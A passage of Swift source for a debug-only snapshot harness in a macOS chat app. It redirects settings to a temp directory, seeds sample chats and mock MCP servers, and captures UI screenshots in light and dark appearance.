#if DEBUG
// Debug-only snapshot harness. Nothing in this file exists in release builds.
//
// Active only when the environment variable PARLEY_SNAPSHOT_DIR is set. It then:
// - redirects ALL UserDefaults access (AppSettings and AppKit's own `standardUserDefaults`
//   writes such as window frames) to plists inside a fresh temp directory,
// - seeds sample conversations into a temp default directory,
// - drives the UI through its main states and writes NN-light-<state>.png / NN-dark-<state>.png
//   into PARLEY_SNAPSHOT_DIR, then exits on its own.
// Optional: PARLEY_SNAPSHOT_MOCK_URL (e.g. http://127.0.0.1:8765/v1, tools/mock_server.py)
// enables the streaming states. Without it, the provider points at an unused dummy localhost URL.
// Optional: PARLEY_SNAPSHOT_STRATA_URL (tools/mock_server.py in its strata-share flavor, no API
// key) adds a "Strata" provider, a seeded Strata chat and the Strata states.
// Optional: PARLEY_SNAPSHOT_MCP_COMMAND (the path of tools/mock_mcp_server.py) adds MCP servers
// and, with PARLEY_SNAPSHOT_MOCK_URL, the live tool states. Secrets stay in memory: no Keychain item
// is read or written.
// Optional: PARLEY_SNAPSHOT_LAUNCH_COMMAND turns the run into the launch check instead of a capture:
// it needs a launch through plain `open`, so the app has launchd's short PATH and not a shell's. It
// connects one stdio server with that command (PARLEY_SNAPSHOT_LAUNCH_ARGS, one per line), using the
// same PATH lookup as the shipped app unless PARLEY_SNAPSHOT_LAUNCH_SHELL names another shell, writes
// what happened to launch-check.json in PARLEY_SNAPSHOT_DIR, and quits through NSApp.terminate, the
// way ⌘Q does, once a file named quit appears there. `open --env` gives the app the caller's whole
// environment, PATH included, so these come from Resources/PARLEY_SNAPSHOT_LAUNCH.json in a copy of
// the bundle.
//
// The app is never activated, its windows sit off-screen at alpha 0 and ignore the mouse.
// See tools/snapshot.sh for the one-command run.
//
// Capture: each window's frame view (contentView.superview, so title bar and toolbar are included)
// is drawn with cacheDisplay(in:to:) into a 2x bitmap. Known limits of that method:
// - the app is never active, so windows render in their inactive look (grey traffic lights,
//   grey sidebar selection, dimmed toolbar title);
// - NSPopover chrome (rounded shape, arrow, material) renders as a flat grey rectangle, and the
//   popover is composited below the toolbar's right edge rather than at its live position
//   (NSPopover moves itself onto a real screen because its anchor is off-screen);
// - sheets are composited without their shadow.
// CGWindowListCreateImage is not used: it is obsolete in the macOS 15+ SDK and could trigger a
// screen-recording prompt.

import AppKit
import ImageIO
import ObjectiveC
import SwiftUI
import UniformTypeIdentifiers
import ParleyCore

@MainActor
enum SnapshotHarness {
    // MARK: - Environment

    /// Settings from a file in the bundle (the launch check), under the environment's.
    nonisolated private static let bundleSettings: [String: String] = {
        guard let url = Bundle.main.url(forResource: "PARLEY_SNAPSHOT_LAUNCH", withExtension: "json"),
              let data = try? Data(contentsOf: url),
              let settings = try? JSONDecoder().decode([String: String].self, from: data) else { return [:] }
        return settings
    }()

    nonisolated private static func setting(_ name: String) -> String? {
        let value = ProcessInfo.processInfo.environment[name] ?? bundleSettings[name] ?? ""
        return value.isEmpty ? nil : value
    }

    nonisolated static let outputDirectoryPath: String? = setting("PARLEY_SNAPSHOT_DIR")

    nonisolated static var isActive: Bool { outputDirectoryPath != nil }

    /// Set by tools/snapshot.sh in its legacy-SDK mode (PARLEY_SNAPSHOT_SDK): views that use
    /// Liquid Glass show their pre-macOS 26 fallback, which cacheDisplay can render.
    nonisolated static let disablesGlass: Bool = {
        !(ProcessInfo.processInfo.environment["PARLEY_SNAPSHOT_NO_GLASS"] ?? "").isEmpty
    }()

    nonisolated static let mockURL: String? = {
        let value = ProcessInfo.processInfo.environment["PARLEY_SNAPSHOT_MOCK_URL"] ?? ""
        return value.isEmpty ? nil : value
    }()

    nonisolated static let strataURL: String? = {
        let value = ProcessInfo.processInfo.environment["PARLEY_SNAPSHOT_STRATA_URL"] ?? ""
        return value.isEmpty ? nil : value
    }()

    nonisolated static let mcpScriptPath: String? = {
        let value = ProcessInfo.processInfo.environment["PARLEY_SNAPSHOT_MCP_COMMAND"] ?? ""
        return value.isEmpty ? nil : value
    }()

    nonisolated static let launchCheckCommand: String? = setting("PARLEY_SNAPSHOT_LAUNCH_COMMAND")

    /// Read by MessageRow: shows the hover action bar for this message without a mouse.
    static var forcedHoverMessageID: UUID?

    /// Read by ToolCallRow: shows every row expanded.
    static var expandsToolRows = false

    /// Observed by MCPSettingsView: opens the import sheet.
    nonisolated static let showMCPImportNotification = Notification.Name("ParleySnapshotShowMCPImport")

    /// Observed by MCPSettingsView: selects the server whose id is the object.
    nonisolated static let selectMCPServerNotification = Notification.Name("ParleySnapshotSelectMCPServer")

    /// Read by MCPImportSheet when it appears: pastes this and goes straight to the review.
    static var importSampleText: String?

    /// Observed by ChatView: opens the per-conversation settings popover.
    nonisolated static let showConversationSettingsNotification = Notification.Name("ParleySnapshotShowConversationSettings")

    /// Observed by ContextStatusBar: opens the context popover.
    nonisolated static let showContextPopoverNotification = Notification.Name("ParleySnapshotShowContextPopover")

    /// Read by ContextPopover when it appears: starts in the reload confirmation (for 16,384 tokens).
    static var showsReloadConfirmation = false

    private static var root: URL?
    private static var defaultDirectory: URL!
    private static var settingsSuiteName = ""
    private static var standardSuiteName = ""
    private static var provider: Provider!
    private static var strataProvider: Provider?
    private static var mcpServerID: UUID?
    /// A server whose program does not exist, for the failed state.
    private static var brokenServerID: UUID?
    private static var ids = SeedIDs()
    private static var logHandle: FileHandle?
    private static var counter = 0
    private static var captured: [String] = []
    private static var startDate = Date()
    private static var skipped: [String] = []

    private struct SeedIDs {
        var main = UUID()
        var encrypted = UUID()
        var chinese = UUID()
        var short: [UUID] = [UUID(), UUID(), UUID()]
        var lastAssistantInMain = UUID()
        var strata = UUID()
        var tools = UUID()
        var toolNotes = UUID()
        var links = UUID()
    }

    /// Holds the redirected standard defaults for the swizzled `+standardUserDefaults`.
    private final class StandardDefaultsBox: @unchecked Sendable {
        nonisolated(unsafe) static var suite: UserDefaults?
    }

    /// The MCP side of the snapshot app: the same connection manager as the real app, but every
    /// secret stays in memory, so no Keychain item is ever read or written.
    static func mcpServices() -> (host: MCPToolHost, secrets: MCPSecretStore) {
        let secrets = mcpSecrets
        guard launchCheckCommand != nil else {
            return (MCPConnectionManager(secrets: secrets, pathResolver: ShellPATHResolver(shell: "/usr/bin/true")), secrets)
        }
        // Everything but the secret store as in the shipped app: that is what the check is about.
        return (MCPConnectionManager(secrets: secrets, pathResolver: ShellPATHResolver(shell: setting("PARLEY_SNAPSHOT_LAUNCH_SHELL"))), secrets)
    }

    private static let mcpSecrets = InMemoryMCPSecretStore()

    /// Called from ParleyApp.init (before applicationWillFinishLaunching and before
    /// AppState.shared exists). Idempotent.
    static func bootstrapIfNeeded() {
        guard isActive, root == nil else { return }
        let fm = FileManager.default
        let tmp = fm.temporaryDirectory.appendingPathComponent("ParleySnapshot-\(UUID().uuidString)", isDirectory: true)
        try? fm.createDirectory(at: tmp, withIntermediateDirectories: true)
        root = tmp
        defaultDirectory = tmp.appendingPathComponent("Conversations", isDirectory: true)
        try? fm.createDirectory(at: defaultDirectory, withIntermediateDirectories: true)

        if let out = outputDirectoryPath {
            try? fm.createDirectory(atPath: out, withIntermediateDirectories: true)
            let logURL = URL(fileURLWithPath: out).appendingPathComponent("snapshot-log.txt")
            fm.createFile(atPath: logURL.path, contents: nil)
            logHandle = try? FileHandle(forWritingTo: logURL)
        }

        // Absolute-path suite names: CFPreferences stores the plist at that path (inside tmp).
        settingsSuiteName = tmp.appendingPathComponent("settings").path
        standardSuiteName = tmp.appendingPathComponent("standard").path
        redirectStandardDefaults(to: UserDefaults(suiteName: standardSuiteName))
        allowOffscreenWindows()
        hideWindowsBeforeTheyAppear()
        startDate = Date()

        // Hard stop, on a background queue so a modal on the main thread cannot block it.
        let rootPath = tmp.path
        DispatchQueue.global().asyncAfter(deadline: .now() + 300) {
            FileHandle.standardError.write(Data("[snapshot] watchdog: giving up after 300 s\n".utf8))
            try? FileManager.default.removeItem(atPath: rootPath)
            exit(3)
        }
        log("bootstrap: tmp=\(tmp.path) bundle=\(Bundle.main.bundleIdentifier ?? "nil") mock=\(mockURL ?? "none") strata=\(strataURL ?? "none")")
    }

    /// Makes `UserDefaults.standard` (and AppKit's internal use of it: window frames, split
    /// view positions, NSQuitAlwaysKeepsWindows) point at the temp suite, so the user's real
    /// settings domain is never written.
    private static func redirectStandardDefaults(to suite: UserDefaults?) {
        guard let suite else {
            FileHandle.standardError.write(Data("[snapshot] could not create the standard suite\n".utf8))
            exit(4)
        }
        StandardDefaultsBox.suite = suite
        let block: @convention(block) (AnyObject) -> UserDefaults = { _ in StandardDefaultsBox.suite! }
        guard let method = class_getClassMethod(UserDefaults.self, #selector(getter: UserDefaults.standard)) else {
            FileHandle.standardError.write(Data("[snapshot] could not redirect standard defaults\n".utf8))
            exit(4)
        }
        method_setImplementation(method, imp_implementationWithBlock(block))
        guard UserDefaults.standard === suite else {
            FileHandle.standardError.write(Data("[snapshot] standard defaults redirect failed\n".utf8))
            exit(4)
        }
    }

    /// AppKit pulls titled windows back onto a screen when they are shown or moved. In snapshot
    /// mode windows must stay fully off-screen, so frame constraining becomes the identity.
    private static func allowOffscreenWindows() {
        let selector = #selector(NSWindow.constrainFrameRect(_:to:))
        guard let method = class_getInstanceMethod(NSWindow.self, selector) else {
            log("could not disable window frame constraining; windows stay at alpha 0 instead")
            return
        }
        let block: @convention(block) (NSWindow, NSRect, NSScreen?) -> NSRect = { _, rect, _ in rect }
        method_setImplementation(method, imp_implementationWithBlock(block))
    }

    /// Every window is ordered in through -[NSWindow orderWindow:relativeTo:]. Making it
    /// transparent, mouse-transparent and off-screen right before that call means no window is
    /// ever shown on the user's screen, not even for a frame.
    private static func hideWindowsBeforeTheyAppear() {
        let selector = #selector(NSWindow.order(_:relativeTo:))
        guard let method = class_getInstanceMethod(NSWindow.self, selector) else {
            log("could not hook window ordering; relying on the hide timer")
            return
        }
        typealias OrderFn = @convention(c) (NSWindow, Selector, Int, Int) -> Void
        let original = unsafeBitCast(method_getImplementation(method), to: OrderFn.self)
        let block: @convention(block) (NSWindow, Int, Int) -> Void = { window, place, other in
            MainActor.assumeIsolated {
                if place != NSWindow.OrderingMode.out.rawValue {
                    prepareHidden(window)
                    log("ordering in \(type(of: window)) frame=\(window.frame) alpha=\(window.alphaValue)")
                }
            }
            original(window, selector, place, other)
        }
        method_setImplementation(method, imp_implementationWithBlock(block))
    }

    /// The AppSettings AppState.shared uses in snapshot mode (nil when inactive).
    static func isolatedSettingsIfActive() -> AppSettings? {
        guard isActive else { return nil }
        bootstrapIfNeeded()
        guard let defaults = UserDefaults(suiteName: settingsSuiteName) else {
            FileHandle.standardError.write(Data("[snapshot] could not create the settings suite\n".utf8))
            exit(4)
        }
        let settings = AppSettings(defaults: defaults)
        let p = Provider(name: mockURL == nil ? "Local server" : "Mock server",
                         baseURL: mockURL ?? "http://127.0.0.1:9/v1",
                         defaultModel: "mock-plain")
        provider = p
        // The second provider is display-only (never contacted): a LAN example, not an internet API.
        settings.providers = [p, Provider(name: "Studio Mac (LAN)", baseURL: "http://192.168.1.20:1234/v1", defaultModel: "qwen3-14b-instruct")]
        if let strataURL {
            // The mock in its strata-share flavor (127.0.0.1, no key): never a real Strata server.
            let strata = Provider(name: "Strata", baseURL: strataURL, defaultModel: "strata-qwen")
            strataProvider = strata
            settings.providers.append(strata)
            // Strata's shared port does not report the context length: the user's own value.
            settings.setManualContextLength(32768, providerID: strata.id, model: "strata-qwen")
            // The seeded chat's overflow error named the same size (the popover's "Last error" row).
            settings.setLearnedContextLength(32768, providerID: strata.id, model: "strata-qwen")
        }
        settings.defaultProviderID = p.id
        settings.defaultDirectoryPath = defaultDirectory.path
        // The main sample chat's model is not on the mock server: its limit is the user's own value.
        settings.setManualContextLength(32768, providerID: p.id, model: "qwen3-14b-instruct")
        settings.setManualContextLength(32768, providerID: p.id, model: "mock-tools")
        addMCPServers(to: settings)
        do {
            try seed()
        } catch {
            log("seed failed: \(error)")
        }
        return settings
    }

    /// A local server backed by the stdio mock, and a remote one that is shown but never contacted.
    private static func addMCPServers(to settings: AppSettings) {
        guard let script = mcpScriptPath else { return }
        var local = MCPServerConfig(name: "filesystem", command: "/usr/bin/python3", envNames: ["SAMPLE_TOKEN"],
                                    disabledTools: ["delete_file"], alwaysAllowedTools: ["read_file": "0123456789abcdef"])
        let localSecrets = MCPServerSecrets(args: ["-I", script, "--transport", "stdio", "--max-seconds", "290"],
                                            env: ["SAMPLE_TOKEN": "not-a-real-token"])
        var remote = MCPServerConfig(name: "team-docs", kind: MCPServerConfig.kindHTTP, urlHost: "docs.example.com",
                                     headerNames: ["Authorization"], useInNewChats: true)
        let remoteSecrets = MCPServerSecrets(url: "https://docs.example.com/mcp", headers: ["Authorization": "Bearer not-a-real-token"])
        for (config, secrets) in [(local, localSecrets), (remote, remoteSecrets)] {
            try? mcpSecrets.setSecrets(secrets, for: config.id)
        }
        (local.connectionFingerprint, local.identityFingerprint) = MCPServerConfig.fingerprints(config: local, secrets: localSecrets)
        (remote.connectionFingerprint, remote.identityFingerprint) = MCPServerConfig.fingerprints(config: remote, secrets: remoteSecrets)
        remote.isEnabled = false
        var broken = MCPServerConfig(name: "sqlite", command: "uvx")
        let brokenSecrets = MCPServerSecrets(args: ["mcp-server-sqlite"], env: ["PATH": "/nonexistent"])
        broken.envNames = ["PATH"]
        (broken.connectionFingerprint, broken.identityFingerprint) = MCPServerConfig.fingerprints(config: broken, secrets: brokenSecrets)
        try? mcpSecrets.setSecrets(brokenSecrets, for: broken.id)
        mcpServerID = local.id
        brokenServerID = broken.id
        settings.mcpServers = [local, remote, broken]
    }

    // MARK: - App lifecycle hooks

    static func applicationWillFinishLaunching() {
        // Never a regular foreground app: no Dock icon, no menu bar takeover, no activation.
        NSApp.setActivationPolicy(.accessory)
    }

    static func applicationDidFinishLaunching() {
        hideWindows()
        // Catch windows as soon as AppKit updates them, plus a timer as a safety net.
        NotificationCenter.default.addObserver(forName: NSWindow.didUpdateNotification, object: nil, queue: .main) { _ in
            MainActor.assumeIsolated { hideWindows() }
        }
        let timer = Timer(timeInterval: 0.05, repeats: true) { _ in
            MainActor.assumeIsolated { hideWindows() }
        }
        RunLoop.main.add(timer, forMode: .common)
        AppState.shared.reloadLibrary()
        Task { @MainActor in
            await run()
        }
    }

    private static let mainOrigin = NSPoint(x: -20000, y: 200)
    private static let settingsOrigin = NSPoint(x: -23000, y: 200)
    private static let popoverOrigin = NSPoint(x: -26000, y: 1200)

    private static func isPopover(_ window: NSWindow) -> Bool {
        String(describing: type(of: window)).contains("Popover")
    }

    /// Keeps every window invisible to the user: alpha 0, mouse-transparent, off-screen.
    private static func hideWindows() {
        for window in NSApp.windows {
            prepareHidden(window)
        }
    }

    private static func prepareHidden(_ window: NSWindow) {
        if window.alphaValue != 0 { window.alphaValue = 0 }
        if !window.ignoresMouseEvents { window.ignoresMouseEvents = true }
        window.isRestorable = false
        // Sheets and child windows follow their parent.
        guard window.sheetParent == nil, window.parent == nil,
              window.styleMask.contains(.titled) || isPopover(window) else { return }
        let target = isPopover(window) ? popoverOrigin : isSettingsWindow(window) ? settingsOrigin : mainOrigin
        if window.frame.origin != target {
            window.setFrameOrigin(target)
        }
    }

    private static func isSettingsWindow(_ window: NSWindow) -> Bool {
        (window.identifier?.rawValue ?? "").contains("Settings")
    }

    private static var mainWindow: NSWindow? {
        NSApp.windows.first { w in
            w.styleMask.contains(.titled) && w.sheetParent == nil && !isSettingsWindow(w)
                && w.contentView?.subviews.isEmpty == false
        }
    }

    private static var settingsWindow: NSWindow? {
        NSApp.windows.first { isSettingsWindow($0) && $0.isVisible }
    }

    // MARK: - Script

    /// The launch check (see the top of this file).
    private static func runLaunchCheck(command: String) async {
        let appState = AppState.shared
        let arguments = (setting("PARLEY_SNAPSHOT_LAUNCH_ARGS") ?? "").split(separator: "\n").map(String.init)
        let config: MCPServerConfig
        do {
            config = try appState.saveServer(MCPServerConfig(name: "launch-check", command: command), secrets: MCPServerSecrets(args: arguments))
        } catch {
            log("launch check: could not save the server: \(error)")
            return
        }
        appState.connectServer(config.id)
        await waitFor(seconds: 60) {
            switch appState.mcpSnapshots[config.id]?.state {
            case .ready, .failed: return true
            default: return false
            }
        }
        let snapshot = appState.mcpSnapshots[config.id]
        let report: [String: Any] = [
            "appPATH": ProcessInfo.processInfo.environment["PATH"] ?? "(none)",
            "bundle": Bundle.main.bundleIdentifier ?? "(none)",
            "state": String(describing: snapshot?.state),
            "tools": snapshot?.tools.map(\.name) ?? [],
            "protocol": snapshot?.protocolVersion ?? "(none)",
        ]
        let directory = URL(fileURLWithPath: outputDirectoryPath ?? ".")
        if let data = try? JSONSerialization.data(withJSONObject: report, options: [.prettyPrinted, .sortedKeys]) {
            try? data.write(to: directory.appendingPathComponent("launch-check.json"))
        }
        let quit = directory.appendingPathComponent("quit").path
        while !FileManager.default.fileExists(atPath: quit) { await wait(0.1) }
        NSApp.terminate(nil)
    }

    /// The launch check ends through the app's own quit, which never reaches `finish`.
    static func removeTemporaryFilesAtQuit() {
        try? logHandle?.close()
        if let root { try? FileManager.default.removeItem(at: root) }
    }

    private static func run() async {
        if let launchCheckCommand {
            await runLaunchCheck(command: launchCheckCommand)
            return
        }
        let appState = AppState.shared
        await wait(1.0)
        if mainWindow == nil {
            // With the macOS 26+ SDK an inactive (accessory) app does not open its main window
            // at launch; open it through its Window menu item, as the app's own safety net does.
            log("no main window after 1 s; opening it through the Window menu")
            MainWindow.showViaMenu()
            await waitFor(seconds: 5) { mainWindow != nil }
        }
        guard let window = mainWindow else {
            log("no main window; windows: \(NSApp.windows.map { "\(type(of: $0)) \($0.identifier?.rawValue ?? "-")" })")
            finish()
            return
        }
        window.setContentSize(NSSize(width: 1100, height: 760))
        hideWindows()
        await waitFor(seconds: 4) { appState.entries.count >= 6 }
        log("library entries: \(appState.entries.count)")

        for appearance in ["light", "dark"] {
            let dark = appearance == "dark"
            NSApp.appearance = NSAppearance(named: dark ? .darkAqua : .aqua)
            forcedHoverMessageID = nil

            // 1. Nothing selected.
            appState.selection = nil
            await wait(0.8)
            capture(appearance, "empty-state")

            // 2./3. The sample chat, top and bottom.
            await select(ids.main)
            await scrollChat(toTop: true)
            capture(appearance, "chat-top")
            logSidebarTable(window: window, appearance: appearance)
            await scrollChat(toTop: false)
            capture(appearance, "chat-bottom")

            // 4. Per-conversation settings popover, then with "None (no thinking)" chosen on a
            //    server that is not Strata: the picker's new choice and its footer note.
            await capturePopover(appearance)
            if let session = appState.session(for: ids.main) {
                let saved = (session.conversation.settings.reasoningEffort, session.conversation.settings.disablesThinking)
                session.conversation.settings.reasoningEffort = nil
                session.conversation.settings.disablesThinking = true
                await capturePopover(appearance, "conversation-settings-none")
                session.conversation.settings.reasoningEffort = saved.0
                session.conversation.settings.disablesThinking = saved.1
            }

            // 5. Hover action bar, forced through state (rows are rebuilt when re-selected).
            if !dark {
                forcedHoverMessageID = ids.lastAssistantInMain
                await select(ids.short[0])
                await select(ids.main)
                await scrollChat(toTop: false)
                capture(appearance, "hover-actions")
                forcedHoverMessageID = nil
            }

            // 5b. Minimum window size: the toolbar must still fit.
            if !dark {
                window.setContentSize(NSSize(width: 760, height: 480))
                hideWindows()
                await wait(0.8)
                capture(appearance, "narrow-window")
                window.setContentSize(NSSize(width: 1100, height: 760))
                hideWindows()
                await wait(0.6)
            }

            // 6. Chinese conversation.
            await select(ids.chinese)
            capture(appearance, "chat-chinese")

            // 7. Locked encrypted conversation.
            await select(ids.encrypted)
            capture(appearance, "unlock")

            // 8. New Chat sheet.
            appState.showNewChatSheet = true
            await wait(1.2)
            capture(appearance, "new-chat-sheet", includeSheet: true)
            appState.showNewChatSheet = false
            await wait(0.8)

            // 9. Settings window, each tab.
            await captureSettings(appearance)

            // 10. Empty new chat, then streaming into it.
            do {
                try await appState.createConversation(title: "", directory: defaultDirectory, password: nil)
            } catch {
                log("createConversation failed: \(error)")
            }
            await wait(1.0)
            capture(appearance, "new-chat-empty")
            await captureStreaming(appearance)
            await captureTools(appearance)
            await captureLinks(appearance)

            // 11. Strata: its chat, context popover, settings, prompt reading, a refused image.
            await captureStrata(appearance)
        }

        finish()
    }

    private static func select(_ id: UUID) async {
        AppState.shared.selection = id
        await waitFor(seconds: 3) {
            AppState.shared.session(for: id) != nil || AppState.shared.entry(id: id)?.isEncrypted == true
        }
        await wait(0.6)
    }

    private static func captureStreaming(_ appearance: String) async {
        guard mockURL != nil else {
            skip("\(appearance) streaming states (PARLEY_SNAPSHOT_MOCK_URL not set)")
            return
        }
        let appState = AppState.shared
        guard let session = appState.session(for: appState.selection) else {
            skip("\(appearance) streaming states (no open session)")
            return
        }
        session.conversation.settings.model = "mock-slow-think"
        session.send(
            text: "Plan a three-step migration from Core Data to SwiftData, and think it through first.",
            attachments: [],
            settings: appState.settings
        )
        // mock-slow-think: reasoning for ~2.4 s, then content.
        await wait(1.4)
        capture(appearance, "streaming-thinking")
        // The status strip shows the live speed and the context in use (bottom right).
        await waitFor(seconds: 4) {
            session.conversation.messages.last.map { !$0.content.isEmpty } ?? false
        }
        await wait(0.8)
        capture(appearance, "streaming-reply")
        session.stop()
        await wait(0.6)

        // Context popover for an LM Studio model (the mock's), then its reload confirmation.
        await captureContextPopover(appearance, "context-popover")
        if appearance == "light" {
            showsReloadConfirmation = true
            await captureContextPopover(appearance, "context-reload-confirm")
            showsReloadConfirmation = false
        }

        // "None (no thinking)" that LM Studio ignored (its hint), one a server refused (the reply
        // was asked for again without it), and the next refused one in the short form.
        session.conversation.messages.append(Message(role: .user, content: "Just the answer: what is 17 × 23?"))
        var ignored = Message(role: .assistant, content: "17 × 23 = **391**.", reasoning: "17 × 20 = 340, 17 × 3 = 51, so 391.",
                              reasoningDuration: 1.2, model: "qwen3-14b-instruct")
        ignored.thinkingOffIgnored = true
        ignored.thinkingOffServerKind = InferenceServerKind.lmStudio.rawValue
        session.conversation.messages.append(ignored)
        session.conversation.messages.append(Message(role: .user, content: "And 19 × 21?"))
        var refused = Message(role: .assistant, content: "19 × 21 = **399**.", reasoning: "(20 − 1)(20 + 1) = 400 − 1.",
                              reasoningDuration: 0.8, model: "qwen3-14b-instruct")
        refused.thinkingOffNotAccepted = true
        session.conversation.messages.append(refused)
        session.conversation.messages.append(Message(role: .user, content: "And 31 × 29?"))
        var refusedAgain = Message(role: .assistant, content: "31 × 29 = **899**.", reasoning: "(30 + 1)(30 − 1) = 900 − 1.",
                                   reasoningDuration: 0.7, model: "qwen3-14b-instruct")
        refusedAgain.thinkingOffNotAccepted = true
        session.conversation.messages.append(refusedAgain)
        await wait(0.6)
        await scrollChat(toTop: false)
        capture(appearance, "thinking-off-notes")
    }

    /// Tool rounds: seeded rows and notes, then a live reply through the stdio mock.
    private static func captureTools(_ appearance: String) async {
        guard let serverID = mcpServerID else {
            skip("\(appearance) tool states (PARLEY_SNAPSHOT_MCP_COMMAND not set)")
            return
        }
        let appState = AppState.shared
        await select(ids.tools)
        await scrollChat(toTop: true)
        capture(appearance, "tool-rows-collapsed")
        expandsToolRows = true
        await select(ids.short[0])
        await select(ids.tools)
        await scrollChat(toTop: true)
        capture(appearance, "tool-rows-expanded")
        expandsToolRows = false
        await select(ids.toolNotes)
        await scrollChat(toTop: false)
        capture(appearance, "tool-notes")

        // New Chat with a server marked for new chats.
        if let index = appState.settings.mcpServers.firstIndex(where: { $0.id == serverID }) {
            appState.settings.mcpServers[index].useInNewChats = true
            appState.showNewChatSheet = true
            await wait(1.2)
            capture(appearance, "new-chat-tools", includeSheet: true)
            appState.showNewChatSheet = false
            await wait(0.8)
            appState.settings.mcpServers[index].useInNewChats = false
        }

        guard mockURL != nil else {
            skip("\(appearance) live tool states (PARLEY_SNAPSHOT_MOCK_URL not set)")
            return
        }
        do {
            try await appState.createConversation(title: "Release notes", directory: defaultDirectory, password: nil, mcpServerIDs: [serverID])
        } catch {
            log("createConversation failed: \(error)")
            return
        }
        guard let session = appState.session(for: appState.selection) else { return }
        session.conversation.settings.model = "mock-tools"
        await wait(0.8)
        await captureToolsPopover(appearance, session)

        session.send(text: #"Echo the release notes. tool=filesystem__echo args={"text":"Parley 1.4 adds MCP tools.","repeat":1,"path":"~/Projects/parley/CHANGELOG.md"}"#,
                     attachments: [], settings: appState.settings)
        await waitFor(seconds: 8) { session.pendingApproval != nil }
        // Past ToolApprovalCard.armDelay, so the card shows its working buttons.
        await wait(ToolApprovalCard.armDelay + 0.3)
        await scrollChat(toTop: false)
        capture(appearance, "approval-card")
        if appearance == "light", let window = mainWindow {
            window.setContentSize(NSSize(width: 760, height: 480))
            hideWindows()
            await wait(0.8)
            await scrollChat(toTop: false)
            capture(appearance, "approval-card-narrow")
            window.setContentSize(NSSize(width: 1100, height: 760))
            hideWindows()
            await wait(0.6)
        }
        session.answerApproval(.allowOnce)
        await waitFor(seconds: 5) { !session.isStreaming }

        // The strip while a tool runs.
        session.send(text: #"Now wait a little. tool=filesystem__slow args={"seconds":3}"#, attachments: [], settings: appState.settings)
        await waitFor(seconds: 5) { session.pendingApproval != nil }
        session.answerApproval(.allowOnce)
        await wait(0.8)
        await scrollChat(toTop: false)
        capture(appearance, "strip-running-tool")
        await waitFor(seconds: 6) { !session.isStreaming }
    }

    /// The confirmation for the link in the seeded chat, taken from its rendered text. Nothing can
    /// open: `openLink` only logs.
    private static func captureLinks(_ appearance: String) async {
        let appState = AppState.shared
        appState.openLink = { log("ERROR: openLink called with \($0.absoluteString)") }
        guard let window = mainWindow else { return }
        await select(ids.links)
        let reply = appState.session(for: ids.links)?.conversation.messages.last?.content ?? ""
        guard let link = MarkdownParser.inline(reply).runs.compactMap(\.link).first, appState.requestOpen(link) else {
            skip("\(appearance) link-confirmation (no link in the seeded reply)")
            return
        }
        // Past the arm delay, so the sheet shows its working buttons.
        await wait(ToolApprovalCard.armDelay + 0.8)
        capture(appearance, "link-confirmation", includeSheet: true)
        if appearance == "light" {
            window.setContentSize(NSSize(width: 760, height: 480))
            hideWindows()
            await wait(0.8)
            capture(appearance, "link-confirmation-narrow", includeSheet: true)
            window.setContentSize(NSSize(width: 1100, height: 760))
            hideWindows()
            await wait(0.6)
        }
        appState.pendingLink = nil
        await wait(0.8)
    }

    /// The composer's tools popover, composited above the button (bottom left of the chat).
    private static func captureToolsPopover(_ appearance: String, _ session: ConversationSession) async {
        AppState.shared.toolsPopoverRequest = session.id
        await wait(1.0)
        guard let popover = NSApp.windows.first(where: { isPopover($0) && $0.isVisible }),
              let popoverView = popover.contentView?.superview ?? popover.contentView else {
            skip("\(appearance) tools popover (no popover window appeared)")
            return
        }
        capture(appearance, "composer-tools-popover", overlays: [(popoverView, NSPoint(x: 300, y: 112))])
        closePopovers()
        await wait(0.6)
    }

    private static func captureStrata(_ appearance: String) async {
        guard let strata = strataProvider else {
            skip("\(appearance) Strata states (PARLEY_SNAPSHOT_STRATA_URL not set)")
            return
        }
        let appState = AppState.shared
        await select(ids.strata)
        // ChatView probes the mock: owned_by "strata", so the kind is known and nothing else is asked.
        await waitFor(seconds: 4) { appState.contextInfo(provider: strata, model: "strata-qwen")?.serverKind == .strata }
        await scrollChat(toTop: false)
        capture(appearance, "strata-chat")
        await captureContextPopover(appearance, "strata-context-popover")
        await capturePopover(appearance, "strata-conversation-settings")
        // "None" on Strata: its own footer line, the budget toggle disabled.
        if let session = appState.session(for: ids.strata) {
            let saved = (session.conversation.settings.reasoningEffort, session.conversation.settings.disablesThinking)
            session.conversation.settings.reasoningEffort = nil
            session.conversation.settings.disablesThinking = true
            await capturePopover(appearance, "strata-conversation-settings-none")
            session.conversation.settings.reasoningEffort = saved.0
            session.conversation.settings.disablesThinking = saved.1
        }

        // A new Strata chat: prompt reading before the first token, then a refused image.
        do {
            try await appState.createConversation(title: "", directory: defaultDirectory, password: nil)
        } catch {
            log("createConversation failed: \(error)")
            return
        }
        guard let session = appState.session(for: appState.selection) else { return }
        session.conversation.settings.providerID = strata.id
        session.conversation.settings.model = "strata-slow"
        await wait(0.8)
        session.send(text: "Go through the whole design doc again and list every open question.", attachments: [], settings: appState.settings)
        await waitFor(seconds: 3) { session.liveGeneration?.promptProgress.map { $0.fraction > 0.4 } ?? false }
        await wait(0.3)
        capture(appearance, "strata-reading-prompt")
        session.stop()
        await wait(0.4)

        session.conversation.settings.model = "strata-novision"
        let image = Attachment(kind: .image, filename: "whiteboard.png", mimeType: "image/png", data: samplePNG())
        session.send(text: "What does the whiteboard say?", attachments: [image], settings: appState.settings)
        await waitFor(seconds: 4) { !session.isStreaming }
        // ChatView's onChange(isStreaming) records the refusal; the next image is warned about.
        await waitFor(seconds: 2) { appState.contextInfo(provider: strata, model: "strata-novision")?.acceptsImages == false }
        session.draftAttachments = [image]
        session.draftText = "And this one?"
        await wait(0.8)
        capture(appearance, "strata-image-refused")
        session.draftAttachments = []
        session.draftText = ""
        await wait(0.3)

        // Refused before sending (the share's 12 MiB): a short title and no Retry.
        if appearance == "light" {
            session.conversation.messages.append(Message(role: .user, content: "Compare all four photos again."))
            session.conversation.messages.append(Message(
                role: .assistant, content: "", model: "strata-qwen", isComplete: false,
                error: "API error: This request is 14.2 MB, more than the 12.0 MB the server accepts. Images are sent again with every message: remove some, or fork from a message before the first image."))
            await wait(0.6)
            await scrollChat(toTop: false)
            capture(appearance, "strata-too-large")

            // Through a Cloudflare Tunnel: the edge's 524 after 100 s, and a reply cut off mid-stream.
            session.conversation.messages.append(Message(role: .user, content: "Summarize the four photos in one table."))
            session.conversation.messages.append(Message(
                role: .assistant, content: "", model: "strata-qwen", isComplete: false,
                error: "HTTP 524: Cloudflare error 524: A timeout occurred · Ray ID 8f1a2b3c4d5e6f70-SYD"))
            session.conversation.messages.append(Message(role: .user, content: "Try again, shorter."))
            session.conversation.messages.append(Message(
